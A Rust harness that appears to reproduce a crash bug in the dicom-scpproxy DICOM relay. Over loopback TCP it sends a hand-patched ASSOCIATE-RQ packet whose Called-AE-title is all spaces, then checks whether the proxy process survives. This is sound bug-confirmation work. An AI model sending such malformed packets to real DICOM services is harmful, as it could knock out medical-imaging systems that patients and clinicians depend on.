// Real, two-real-participant (plus a real third-party relay target), real-loopback-TCP
// reproduction (per CONFIRMATION.md section 11).
//
// Runs the actual `dicom-scpproxy` binary (path given as argv[1]) as a real subprocess,
// relaying to a real fake SCP built on `dicom-ul`'s own real, public server association API.
// A genuinely separate process (this one) connects to the real `scpproxy` listen port over a
// real TCP socket and sends a real (if deliberately non-compliant) ASSOCIATE-RQ PDU whose
// Called-AE-title is all spaces - built by taking a normal PDU that `dicom-ul`'s own real
// `write_pdu` produces and patching just that one 16-byte field afterward, since `write_pdu`
// itself refuses to encode this value directly (a real compliant client cannot produce this
// exact malformed PDU through the public API - it must be assembled this way, matching what a
// genuinely non-compliant/malicious real client would send on the wire).
use dicom_ul::pdu::{write_pdu, AssociationRQ, Pdu, PresentationContextProposed};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

fn make_rq(calling: &str) -> Vec<u8> {
    let pdu = Pdu::AssociationRQ(AssociationRQ {
        protocol_version: 1,
        calling_ae_title: calling.to_string(),
        called_ae_title: "SCP".to_string(),
        application_context_name: "1.2.840.10008.3.1.1.1".to_string(),
        presentation_contexts: vec![PresentationContextProposed {
            id: 1,
            abstract_syntax: "1.2.840.10008.1.1".to_string(),
            transfer_syntaxes: vec!["1.2.840.10008.1.2".to_string()],
        }],
        user_variables: vec![],
    });
    let mut wire = vec![];
    write_pdu(&mut wire, &pdu).unwrap();
    wire
}

fn main() {
    let scpproxy_bin = std::env::args().nth(1).expect("usage: repro <path-to-dicom-scpproxy>");

    let scp_listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let scp_port = scp_listener.local_addr().unwrap().port();
    thread::spawn(move || loop {
        let (socket, _) = match scp_listener.accept() {
            Ok(x) => x,
            Err(_) => return,
        };
        thread::spawn(move || {
            let options = dicom_ul::ServerAssociationOptions::new()
                .accept_any()
                .with_transfer_syntax("1.2.840.10008.1.2")
                .with_transfer_syntax("1.2.840.10008.1.2.1")
                .promiscuous(true);
            let _ = options.establish(socket);
        });
    });

    let proxy_port = 25556u16;
    let mut proxy = Command::new(scpproxy_bin)
        .args(["127.0.0.1", &scp_port.to_string(), "-l", &proxy_port.to_string()])
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

    thread::sleep(Duration::from_millis(800));

    // malformed ASSOCIATE-RQ: all-space Called-AE-title
    let mut wire = make_rq("SCU");
    for b in &mut wire[10..26] {
        *b = b' ';
    }

    println!("connecting a real TCP socket to the real scpproxy process and sending a real (malformed) ASSOCIATE-RQ...");
    let mut stream = TcpStream::connect(("127.0.0.1", proxy_port)).unwrap();
    stream.write_all(&wire).unwrap();
    drop(stream);

    thread::sleep(Duration::from_millis(500));

    // is the real scpproxy process still alive and functional?
    let wire2 = make_rq("SCU2");
    let second_ok = match TcpStream::connect(("127.0.0.1", proxy_port)) {
        Ok(mut s) => s.write_all(&wire2).is_ok(),
        Err(_) => false,
    };

    match proxy.try_wait() {
        Ok(Some(status)) => {
            eprintln!("BUG REPRODUCED: real scpproxy process exited/crashed: {status:?}");
            let mut stderr = String::new();
            proxy.stderr.take().unwrap().read_to_string(&mut stderr).ok();
            eprintln!("stderr: {stderr}");
            std::process::exit(1);
        }
        Ok(None) => {
            println!(
                "no crash: real scpproxy process is still running (second connection attempt \
                 succeeded: {second_ok})"
            );
            let _ = proxy.kill();
        }
        Err(e) => {
            eprintln!("could not check proxy status: {e}");
            let _ = proxy.kill();
        }
    }
}
